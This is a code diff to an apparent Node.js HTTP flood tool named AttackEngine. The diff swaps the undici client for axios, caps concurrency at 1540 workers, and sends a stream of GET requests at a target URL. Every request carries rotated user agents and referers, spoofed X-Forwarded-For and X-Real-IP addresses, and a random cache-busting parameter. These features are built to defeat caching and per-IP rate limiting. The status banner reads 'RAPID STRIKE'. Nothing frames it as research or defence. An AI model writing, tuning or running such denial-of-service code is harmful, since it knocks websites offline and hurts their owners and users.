@@ -1,11 +1,11 @@
-const { request } = require('undici');
+const axios = require('axios');
 const fs = require('fs');
 const os = require('os');
-const process = require('process');
 const http = require('http');
 const https = require('https');
+const process = require('process');
 
-const MAX_CONCURRENT = os.cpus().length * 200; // Try up to 1600-3200
+const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 1540); // adjust if needed
 const REQUEST_TIMEOUT = 8000;
 
 function loadLines(filename) {
@@ -22,18 +22,11 @@ function loadLines(filename) {
 const REFERERS = loadLines('refs.txt');
 const USER_AGENTS = loadLines('ua.txt');
 
-const keepAliveHttp = new http.Agent({ keepAlive: true, maxSockets: Infinity });
-const keepAliveHttps = new https.Agent({ keepAlive: true, maxSockets: Infinity });
+const UA_POOL = Array.from({ length: 10000 }, () =>
+    USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0');
 
-const stealthHeaders = {
-    'sec-ch-ua': '"Chromium";v="120", "Not:A-Brand";v="99"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
-    'Upgrade-Insecure-Requests': '1',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'Accept-Language': 'en-US,en;q=0.9'
-};
+const keepAliveHttp = new http.Agent({ keepAlive: true });
+const keepAliveHttps = new https.Agent({ keepAlive: true });
 
 class AttackEngine {
     constructor(target, duration) {
@@ -46,35 +39,55 @@ class AttackEngine {
             errors: 0,
             peakRps: 0
         };
+        this.uaIndex = 0;
         this.running = true;
     }
 
-    getHeaders() {
-        return {
-            ...stealthHeaders,
-            'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0',
-            'Referer': REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com',
-            'X-Forwarded-For': Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.')
-        };
+    getRandomUA() {
+        this.uaIndex = (this.uaIndex + 1) % UA_POOL.length;
+        return UA_POOL[this.uaIndex];
+    }
+
+    getRandomReferer() {
+        return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
     }
 
     async makeRequest() {
-        try {
-            const res = await request(this.target, {
-                method: 'GET',
-                headers: this.getHeaders(),
-                dispatcher: this.target.startsWith('https') ? keepAliveHttps : keepAliveHttp
-            });
+        const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
+        const headers = {
+            'User-Agent': this.getRandomUA(),
+            'Referer': this.getRandomReferer(),
+            'X-Forwarded-For': randomIP,
+            'X-Real-IP': randomIP,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1'
+        };
 
-            if (res.statusCode === 200) {
+        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
+
+        try {
+            const isHttps = this.target.startsWith('https');
+            const response = await axios.get(urlWithNoise, {
+                headers,
+                timeout: REQUEST_TIMEOUT,
+                httpAgent: keepAliveHttp,
+                httpsAgent: keepAliveHttps,
+                validateStatus: null
+            });
+            if (response.status === 200) {
                 this.stats.success++;
-            } else {
-                this.stats.errors++;
+                return;
             }
         } catch {
-            this.stats.errors++;
+            // ignored
         }
-        this.stats.total++;
+
+        this.stats.errors++;
     }
 
     async startWorkers() {
@@ -87,6 +100,7 @@ class AttackEngine {
 
     async workerLoop() {
         while (this.running && Date.now() - this.startTime < this.duration) {
+            this.stats.total++;
             await this.makeRequest();
         }
     }
@@ -98,7 +112,7 @@ class AttackEngine {
             console.log('  ============================================');
             console.log(`  TARGET: ${this.target}`);
             console.log(`  TIME:   ${this.duration / 1000}s`);
-            console.log(`  MODE:   GHOST RUSH - ${MAX_CONCURRENT} Concurrency`);
+            console.log(`  MODE:   RAPID STRIKE - ${MAX_CONCURRENT} Concurrent`);
             console.log('  ============================================\n');
         };
 
